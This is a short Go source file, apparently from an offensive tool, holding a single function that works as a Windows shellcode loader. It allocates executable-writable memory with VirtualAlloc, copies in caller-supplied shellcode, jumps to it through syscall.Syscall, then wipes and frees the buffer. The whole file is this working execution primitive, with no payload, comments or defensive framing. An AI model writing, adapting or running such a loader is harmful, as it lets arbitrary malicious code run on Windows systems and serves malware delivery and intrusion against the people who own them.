package Loader

import (
	"golang.org/x/sys/windows"
	"os"
	"syscall"
	"unsafe"
)

func StaneAloneLoader(shellcode []byte) {
	mem, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		os.Exit(1)
	}
	defer func() {
		err := windows.VirtualFree(mem, 0, windows.MEM_RELEASE)
		if err != nil {
			os.Exit(1)
		}
	}()

	buffer := (*[1_000_000]byte)(unsafe.Pointer(mem))[:len(shellcode):len(shellcode)]
	copy(buffer, shellcode)

	_, _, _ = syscall.Syscall(mem, 0, 0, 0, 0)

	for i := range buffer {
		buffer[i] = 0
	}
}
